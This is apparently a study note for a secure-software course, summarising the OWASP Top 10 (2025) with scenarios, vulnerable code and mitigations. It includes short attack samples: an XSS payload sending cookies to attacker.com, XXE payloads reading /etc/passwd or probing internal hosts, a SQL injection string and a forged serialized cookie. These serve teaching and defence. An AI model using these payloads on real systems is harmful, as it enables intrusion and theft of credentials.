---
type: concept
title: "OWASP Top 10 (2025)"
domain: secure-software-development
course: ICT2216
complexity: high
address: c-000024
tags: [owasp, vulnerabilities, web-security, injection, XSS, supply-chain, cryptography]
updated: 2026-05-11
status: established
created: 2026-05-11
---

# OWASP Top 10 (2025)

The OWASP Top 10 is the definitive reference list of the most critical web application security risks, updated periodically based on real-world vulnerability data. The 2025 edition reflects a significant evolution from 2021, most notably elevating supply chain attacks and adding a new category for mishandled exceptional conditions.

> Reference: https://owasp.org/www-project-top-ten/

---

## Notable Changes from 2021 → 2025

| 2021 | 2025 | Change |
|------|------|--------|
| A06 Vulnerable & Outdated Components | A03 Software Supply Chain Failures | Elevated; scope broadened to entire supply chain |
| A07 Identification & Authentication Failures | A07 Authentication Failures | Name simplified |
| A09 Security Logging & Monitoring Failures | A09 Security Logging & Alerting Failures | "Alerting" added |
| A10 SSRF | A10 Mishandling of Exceptional Conditions | New category replaces SSRF |

---

## The Ten Categories

---

### A01:2025 — Broken Access Control

Attackers modify parameters (URL, request body, cookies) to access unauthorised data or functionality.

**Scenario 1 — Unverified parameter:**
```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
// Attacker: http://example.com/app/accountInfo?acct=notmyacct
```

**Scenario 2 — Force browsing:**
```
http://example.com/app/admin_getappInfo  ← accessible without admin role?
```

**Case Study — Instagram:**
- Attacker requested a 6-digit password reset code, then brute-forced all possible codes via POST requests.
- Rate-limiting was applied **per IP**, not per account — rotating IPs bypassed it entirely.

**Mitigations:** Server-side access control; deny by default; rate-limit per account (not IP); never expose admin functions in client-accessible paths.

---

### A02:2025 — Security Misconfiguration

Default or missing configuration exposes the system to attack.

**Scenarios:**
1. Sample applications with default credentials left on production servers.
2. Directory listing enabled → attacker downloads and decompiles compiled Java classes.
3. Detailed stack traces returned to users → reveals vulnerable component versions.
4. Cloud storage buckets left with default open sharing permissions.

**XML External Entities (XXE):**
```xml
<!-- Read /etc/passwd -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF: probe internal network -->
<!ENTITY xxe SYSTEM "https://192.168.1.1/private">

<!-- DoS: read from infinite source -->
<!ENTITY xxe SYSTEM "file:///dev/random">
```

**Mitigations:** Disable unnecessary features; harden all environments; suppress verbose error messages; restrict XML parser capabilities; enforce least-privilege cloud permissions.

---

### A03:2025 — Software Supply Chain Failures

*Ranked #1 in community survey (50% of respondents).* Evolved from "Using Components with Known Vulnerabilities" (2013) to cover the entire supply chain.

**Scenarios:**
1. A trusted vendor is compromised; malware is distributed via a legitimate software update.
2. A vendor behaves maliciously only under specific conditions.
3. Third-party components run with the same privileges as the application itself.

**Real-world examples:**

| Incident | Year | Impact |
|----------|------|--------|
| SolarWinds | 2019 | ~18,000 organisations compromised via a malicious build update |
| Bybit | 2025 | $1.5 billion stolen via supply chain attack in wallet software |
| Log4Shell (CVE-2021-44228) | 2021 | Apache Log4j RCE zero-day; exploited for ransomware and cryptomining |

**Mitigations:** Software Bill of Materials (SBOM); verify signatures on dependencies; pin dependency versions; scan CI/CD pipelines; monitor build environments.

---

### A04:2025 — Cryptographic Failures

Sensitive data is inadequately protected in transit, at rest, or in processing.

**Key questions to ask:**
- Is data transmitted in cleartext (HTTP, SMTP, FTP)?
- Are old or weak algorithms in use (MD5, SHA-1, DES)?
- Are default or weak cryptographic keys used without rotation?
- Is TLS enforcement (HSTS) missing?
- Is server certificate validation bypassed?

**Scenarios:**
1. Database auto-encrypts credit card numbers but decrypts on retrieval — SQL injection reads them in cleartext.
2. Site doesn't enforce TLS → attacker performs a protocol downgrade attack, intercepts session cookie, hijacks session.
3. Password database uses unsalted or fast hashes → rainbow table or GPU cracking exposes all passwords.

> Storing API keys in source code or plaintext passwords in Dockerfiles are immediate cryptographic failures.

**Mitigations:** Enforce TLS everywhere; use strong, modern algorithms (AES-256, bcrypt/Argon2 for passwords); rotate keys; use salted hashes; apply HSTS.

---

### A05:2025 — Injection (including XSS)

Untrusted data is sent to an interpreter (SQL, HTML, OS, LDAP) without sanitisation.

**SQL Injection:**
```java
// Vulnerable
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";

// Attack: ?id=' or '1'='1
// Fix: use PreparedStatement with parameterised queries
```

**Cross-Site Scripting (XSS) — Three Forms:**

| Form | Description |
|------|-------------|
| **Reflected** | Unvalidated user input immediately echoed back in the HTML response |
| **Stored** | Unsanitised input persisted and later served to other users |
| **DOM** | JavaScript dynamically writes attacker-controlled data into the DOM |

**Stored XSS example:**
```java
// Vulnerable
page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";

// Attack payload:
// '><script>document.location='http://attacker.com/steal?foo='+document.cookie</script>'
```

**Mitigations:** Use parameterised queries / prepared statements; validate and sanitise all input; apply context-aware output encoding; use Content Security Policy (CSP).

---

### A06:2025 — Insecure Design

Design-level flaws that no amount of secure implementation can fix. Requires threat modelling and "Secure by Design" principles.

**Scenarios:**
1. Credential recovery via security questions — prohibited by NIST 800-63b (questions may be known by others).
2. Cinema chain allows group bookings with no rate limits → attacker books 600 seats simultaneously across all cinemas, causing massive revenue loss.

**Mitigations:** Threat model during design; use reference architectures and secure design patterns; apply the principle of least privilege at the design stage; review for misuse/abuse cases.

---

### A07:2025 — Authentication Failures

Weaknesses in authentication allow attackers to assume other users' identities.

**Scenarios:**
1. No protection against credential stuffing → attacker uses lists of breached passwords to validate accounts.
2. Password rotation and complexity policies cause predictable patterns and reuse — NIST 800-63 recommends *against* these; use MFA instead.
3. Session timeout not configured → user's session remains active on a shared computer hours after closing the browser tab.

**Mitigations:** Implement MFA; check passwords against breached-password lists (NIST 800-63); set appropriate session timeouts; use secure, randomly generated session tokens; implement account lockout.

---

### A08:2025 — Software and Data Integrity Failures

Insecure CI/CD pipelines, missing integrity checks, and insecure deserialisation. (New category since 2021.)

**Scenarios:**
1. Home router firmware updated without signature verification → unsigned or malicious firmware accepted.
2. SolarWinds — update mechanism hijacked; 18,000+ organisations affected.

**Insecure deserialisation example:**
```
// Original PHP serialized cookie (role = user)
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b..."}

// Attacker modifies role to "admin"
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b..."}
```

**Mitigations:** Verify digital signatures on updates and software packages; use integrity-check mechanisms (checksums, HMAC); never deserialise untrusted data; use allow-lists for deserialisation.

---

### A09:2025 — Security Logging & Alerting Failures

Insufficient logging means attacks go undetected and unattributed.

**Indicators of failure:**
- Logins, failed logins, and high-value transactions are not logged.
- Logs are only stored locally and can be tampered with.
- No alerting thresholds or escalation processes.
- Penetration testing scans do not trigger alerts.

**Real-world cases:**

| Case | Impact |
|------|--------|
| Children's health plan provider | Breach undetected for **7+ years** (since 2013) due to no logging |
| Major Indian airline | Breach involving 10+ years of passenger data discovered by a third party |
| European airline | 400,000+ payment records harvested; fined **£20 million** under GDPR |

**Mitigations:** Log all authentication events, privilege changes, and high-value transactions; ship logs to a centralised, tamper-evident store; set up automated alerting on anomalous patterns; establish an incident response process.

---

### A10:2025 — Mishandling of Exceptional Conditions *(New)*

Improper error handling, logical errors, and "failing open" rather than securely.

**Related CWEs:**

| CWE | Description |
|-----|-------------|
| CWE-209 | Error messages containing sensitive information |
| CWE-234 | Failure to handle missing parameters |
| CWE-274 | Improper handling of insufficient privileges |
| CWE-476 | NULL pointer dereference |
| CWE-636 | Not failing securely ("failing open") |

**Scenarios:**
1. **Resource exhaustion:** Application catches file upload exceptions but does not release resources → all resources lock up (DoS).
2. **Sensitive data exposure:** Database error messages returned to the user → attacker uses details to craft better SQL injection attacks.
3. **Financial race condition:** Multi-step transaction (debit → credit → log) is not rolled back on failure → attacker exploits timing to drain accounts or duplicate payments.

**Mitigations:** Always release resources in finally blocks; return generic error messages to users; log full detail internally; ensure transactional atomicity; apply rollback on partial failure.

---

## Common Vulnerability Categories (Broader)

Beyond OWASP, software vulnerabilities are often classified as:

1. **Access Control Vulnerabilities** — incorrect permission checks
2. **Data Storage Vulnerabilities** — insecure storage or indexing of sensitive data
3. **Buffer Overflow Vulnerabilities** — writing past allocated memory bounds
4. **Authentication, Authorisation, or Cryptographic Vulnerabilities** — weak credentials or algorithms
5. **Validation Vulnerabilities** — missing or insufficient input validation

---

## Code Review Heuristic

A simple code review example illustrating multiple categories simultaneously:

```c
int balance;  // Global — no access control

void decrease(int amount) {
    if (balance >= amount)
        balance = balance - amount;  // Race condition (no lock)
    else
        printf("Insufficient funds\n");
}

void increase(int amount) {
    balance = balance + amount;  // Integer overflow possible; no validation of negative input
}
```

Issues: global state, no thread safety, integer overflow, no input validation.

---

## Related Concepts

- [[secure-software-requirements]] — OWASP ASVS maps directly onto security requirements; CIA-AAA covers many OWASP risks
- [[vulnerability-tracking-frameworks]] — CVE/NVD track vulnerabilities; MITRE ATT&CK maps techniques to OWASP categories
- [[docker-compose]] — misconfiguration (A02) often arises in container environments
